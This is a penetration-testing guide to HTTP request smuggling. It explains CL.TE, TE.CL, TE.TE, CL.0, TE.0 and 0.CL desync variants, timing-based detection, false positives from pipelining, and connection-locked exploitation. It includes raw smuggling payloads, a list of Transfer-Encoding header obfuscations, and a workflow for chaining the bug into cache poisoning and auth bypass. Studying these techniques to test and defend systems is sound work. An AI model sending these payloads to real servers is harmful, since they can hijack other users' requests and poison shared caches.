# What is

>This vulnerability occurs when a **desyncronization** between **front-end proxies** and the **back-end** server allows an **attacker** to **send** an HTTP **request** that will be **interpreted** as a **single request** by the **front-end** proxies (load balance/reverse-proxy) and **as 2 request** by the **back-end** server.\
This allows a user to **modify the next request that arrives to the back-end server after his**.

* **Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

* **Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

<br>

>[!TIP]
>* NOTE :
>
> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.

<br>

----
#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

-   **Front-End (CL):** Processes the request based on the `Content-Length` header.

-   **Back-End (TE):** Processes the request based on the `Transfer-Encoding` header.

-   **Attack Scenario:**

    -   The attacker sends a request where the `Content-Length` header's value does not match the actual content length.

    -   The front-end server forwards the entire request to the back-end, based on the `Content-Length` value.

    -   The back-end server processes the request as chunked due to the `Transfer-Encoding: chunked` header, interpreting the remaining data as a separate, subsequent request.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 30
        Connection: keep-alive
        Transfer-Encoding: chunked

        0

        GET /404 HTTP/1.1
        Foo: x
        ```

####  TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

-   **Front-End (TE):** Processes the request based on the `Transfer-Encoding` header.

-   **Back-End (CL):** Processes the request based on the `Content-Length` header.

-   **Attack Scenario:**

    -   The attacker sends a chunked request where the chunk size (`7b`) and actual content length (`Content-Length: 4`) do not align.

    -   The front-end server, honoring `Transfer-Encoding`, forwards the entire request to the back-end.

    -   The back-end server, respecting `Content-Length`, processes only the initial part of the request (`7b` bytes), leaving the rest as part of an unintended subsequent request.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 4
        Connection: keep-alive
        Transfer-Encoding: chunked

        7b
        GET /404 HTTP/1.1
        Host: vulnerable-website.com
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 30

        x=
        0
        ```
        

### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

-   **Servers:** Both support `Transfer-Encoding`, but one can be tricked into ignoring it via obfuscation.

-   **Attack Scenario:**

    -   The attacker sends a request with obfuscated `Transfer-Encoding` headers.

    -   Depending on which server (front-end or back-end) fails to recognize the obfuscation, a CL.TE or TE.CL vulnerability may be exploited.

    -   The unprocessed part of the request, as seen by one of the servers, becomes part of a subsequent request, leading to smuggling.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: xchunked
        Transfer-Encoding : chunked
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding: chunked
        Transfer-Encoding: x
        Transfer-Encoding:[tab]chunked
        [space]Transfer-Encoding: chunked
        X: X[\n]Transfer-Encoding: chunked

        Transfer-Encoding
        : chunked
        ```

### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

-   Both servers process the request based solely on the `Content-Length` header.

-   This scenario typically does not lead to smuggling, as there's alignment in how both servers interpret the request length.

-   **Example:**

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 16
    Connection: keep-alive

    Normal Request
    ```

### **CL.0 Scenario**

-   Refers to scenarios where the `Content-Length` header is present and has a value other than zero, indicating that the request body has content. The back-end ignores the `Content-Length` header (which is treated as 0), but the front-end parses it.

-   It's crucial in understanding and crafting smuggling attacks, as it influences how servers determine the end of a request.

-   **Example:**

    ```http
    POST / HTTP/1.1
    Host: vulnerable-website.com
    Content-Length: 16
    Connection: keep-alive

    Non-Empty Body
    ```

### TE.0 Scenario

-   Like the previous one but using TE
-   Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
-   **Example**:

```http
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```

### `0.CL` Scenario

In a `0.CL` sitation a request is send with a Content-Length like:

```http
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET /404 HTTP/1.1
X: Y
```

And the front-end doesn't take the `Content-Length` into account so it only sends the first request to the backend (until the 7 in the example). However, the backend sees the `Content-Length` and waits for a body that never arrives cause the front-end is already waiting for the response.

However, if there is a request that it's possible to send to the backend that is responded before receiving the body of the request, this deadlock won't occure. In IIS for example this happen sending requests to forbidden words like `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), this way, the initial request will be responded directly and the second requets will contain the request of the victim like:

```http
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```

This is useful to cause a desync, but it won't have any impact until now.


### Breaking the web server

This technique is also useful in scenarios where it's possible to **break a web server while reading the initial HTTP data** but **without closing the connection**. This way, the **body** of the HTTP request will be considered the **next HTTP request**.

For example, as explained in [**this writeup**](https://mizu.re/post/twisty-python), In Werkzeug it was possible to send some **Unicode** characters and it will make the server **break**. However, if the HTTP connection was created with the header **`Connection: keep-alive`**, the body of the request won't be read and the connection will still be open, so the **body** of the request will be treated as the **next HTTP request**.

### Forcing via hop-by-hop headers
>Abusing hop-by-hop headers you could indicate the proxy to **delete the header Content-Length or Transfer-Encoding so a HTTP request >smuggling is possible to abuse**.

```http
Connection: Content-Length
```

----------------------------------------------------------------------------------------------------
<h2 align="center">HTTP Desync Attack Cheat Sheet</h2>

<table>
<tr>
<th width="120">Type</th>
<th width="150">Front-End</th>
<th width="150">Back-End</th>
<th>Description</th>
</tr>

<tr>
<td><code>CL.TE</code></td>
<td>Content-Length</td>
<td>Transfer-Encoding</td>
<td>Front-End trusts CL, Back-End trusts TE.</td>
</tr>

<tr>
<td><code>TE.CL</code></td>
<td>Transfer-Encoding</td>
<td>Content-Length</td>
<td>Front-End trusts TE, Back-End trusts CL.</td>
</tr>

<tr>
<td><code>TE.TE</code></td>
<td>Transfer-Encoding</td>
<td>Transfer-Encoding</td>
<td>TE header obfuscation causes parsing discrepancies.</td>
</tr>

<tr>
<td><code>CL.CL</code></td>
<td>Content-Length</td>
<td>Content-Length</td>
<td>Different interpretation of Content-Length headers.</td>
</tr>

<tr>
<td><code>CL.0</code></td>
<td>Body</td>
<td>No Body</td>
<td>Back-End treats Content-Length as zero.</td>
</tr>

<tr>
<td><code>TE.0</code></td>
<td>Chunked Body</td>
<td>No Body</td>
<td>Back-End ignores Transfer-Encoding.</td>
</tr>

<tr>
<td><code>0.CL</code></td>
<td>No Body</td>
<td>Body</td>
<td>Back-End waits for a body that Front-End never sends.</td>
</tr>

<tr>
<td><code>Upgrade</code></td>
<td>HTTP</td>
<td>WebSocket</td>
<td>Protocol desynchronization.</td>
</tr>

<tr>
<td><code>Response</code></td>
<td>Response</td>
<td>Response</td>
<td>Response queue poisoning / response desync.</td>
</tr>

</table>

--------------------------------

# Finding HTTP Request Smuggling

>Identifying HTTP request smuggling vulnerabilities can often be achieved using timing techniques, which rely on observing how long it takes for the server to respond to manipulated requests. These techniques are particularly useful for detecting CL.TE and TE.CL vulnerabilities. Besides these methods, there are other strategies and tools that can be used to find such vulnerabilities:

## Finding CL.TE Vulnerabilities Using Timing Techniques :

-   **Method:**

    -   Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Connection: keep-alive
        Content-Length: 4

        1
        A
        0
        ```

    -   **Observation:**

        -   The front-end server processes the request based on `Content-Length` and cuts off the message prematurely.
        -   The back-end server, expecting a chunked message, waits for the next chunk that never arrives, causing a delay.
-   **Indicators:**

    -   Timeouts or long delays in response.
    -   Receiving a 400 Bad Request error from the back-end server, sometimes with detailed server information.

## Finding TE.CL Vulnerabilities Using Timing Techniques :

-   **Method:**

    -   Send a request that, if the application is vulnerable, will cause the back-end server to wait for additional data.

    -   **Example:**

        ```http
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Transfer-Encoding: chunked
        Connection: keep-alive
        Content-Length: 6

        0
        X
        ```

    -   **Observation:**

        -   The front-end server processes the request based on `Transfer-Encoding` and forwards the entire message.
        -   The back-end server, expecting a message based on `Content-Length`, waits for additional data that never arrives, causing a delay.
---------------------------------------------------------

## Other Methods to Find Vulnerabilities :

-   **Differential Response Analysis:**
    -   Send slightly varied versions of a request and observe if the server responses differ in an unexpected way, indicating a parsing discrepancy.
-   **Using Automated Tools:**
    -   Tools like Burp Suite's 'HTTP Request Smuggler' extension can automatically test for these vulnerabilities by sending various forms of ambiguous requests and analyzing the responses.
-   **Content-Length Variance Tests:**
    -   Send requests with varying `Content-Length` values that are not aligned with the actual content length and observe how the server handles such mismatches.
-   **Transfer-Encoding Variance Tests:**
    -   Send requests with obfuscated or malformed `Transfer-Encoding` headers and monitor how differently the front-end and back-end servers respond to such manipulations.

 ------------------------------------------------------
# The Expect: 100-continue header
Check how this header can help exploiting a http desync in:

### Special Http Headers :

# [![Special HTTP Headers](https://img.shields.io/badge/Read-Special_HTTP_Headers-blue)](Special%20HTTP%20Headers.md)
------------------------------------------------------

## HTTP Request Smuggling Vulnerability Testing

After confirming the effectiveness of timing techniques, it's crucial to verify if client requests can be manipulated. A straightforward method is to attempt poisoning your requests, for instance, making a request to `/` yield a 404 response. The `CL.TE` and `TE.CL` examples previously discussed in Basic Examples demonstrate how to poison a client's request to elicit a 404 response, despite the client aiming to access a different resource.

***Key Considerations***

When testing for request smuggling vulnerabilities by interfering with other requests, bear in mind:

-   **Distinct Network Connections:** The "attack" and "normal" requests should be dispatched over separate network connections. Utilizing the same connection for both doesn't validate the vulnerability's presence.
-   **Consistent URL and Parameters:** Aim to use identical URLs and parameter names for both requests. Modern applications often route requests to specific back-end servers based on URL and parameters. Matching these increases the likelihood that both requests are processed by the same server, a prerequisite for a successful attack.
-   **Timing and Racing Conditions:** The "normal" request, meant to detect interference from the "attack" request, competes against other concurrent application requests. Therefore, send the "normal" request immediately following the "attack" request. Busy applications may necessitate multiple trials for conclusive vulnerability confirmation.
-   **Load Balancing Challenges:** Front-end servers acting as load balancers may distribute requests across various back-end systems. If the "attack" and "normal" requests end up on different systems, the attack won't succeed. This load balancing aspect may require several attempts to confirm a vulnerability.
-   **Unintended User Impact:** If your attack inadvertently impacts another user's request (not the "normal" request you sent for detection), this indicates your attack influenced another application user. Continuous testing could disrupt other users, mandating a cautious approach.


#### Distinguishing HTTP/1.1 pipelining artifacts vs genuine request smuggling

>Connection reuse (keep-alive) and pipelining can easily produce illusions of "smuggling" in testing tools that send multiple requests on the same socket. Learn to separate harmless client-side artifacts from real server-side desync.

### Why pipelining creates classic false positives

HTTP/1.1 reuses a single TCP/TLS connection and concatenates requests and responses on the same stream. In pipelining, the client sends multiple requests back-to-back and relies on in-order responses. A common false-positive is to resend a malformed CL.0-style payload twice on a single connection:

```http
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```

Responses may look like:

```http
HTTP/1.1 200 OK
Content-Type: text/html
```

```http
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```

If the server ignored the malformed `Content_Length`, there is no FE↔BE desync. With reuse, your client actually sent this byte-stream, which the server parsed as two independent requests:

```http
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```

Impact: none. You just desynced your client from the server framing.

-----------------

>[!IMPORTANT]
>
>Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", >Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

--------------------

## Litmus tests: pipelining or real desync?

1.  Disable reuse and re-test
    -   In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
    -   In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
    -   If the behavior disappears, it was likely client-side pipelining, unless you're dealing with connection-locked/stateful targets or client-side desync.
2.  HTTP/2 nested-response check
    -   Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you've proven a backend parsing/desync bug instead of a pure client artifact.
3.  Partial-requests probe for connection-locked front-ends
    -   Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
    -   See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.
4.  State probes
    -   Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
    -   Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
5.  Visualize the wire
    -   Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.
  
## Connection‑locked request smuggling (reuse-required)

Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:

-   Prove the server-side bug
    -   Use the HTTP/2 nested-response check, or
    -   Use partial-requests to show the FE only reuses upstream when the client does.
-   Show real impact even if direct cross-user socket abuse is blocked:
    -   Cache poisoning: poison shared caches via the desync so responses affect other users.
    -   Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
    -   Bypass FE controls: smuggle restricted paths/methods past the front-end.
    -   Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
-   Operator workflow
    -   Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
    -   Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.
 
    -----------------------------
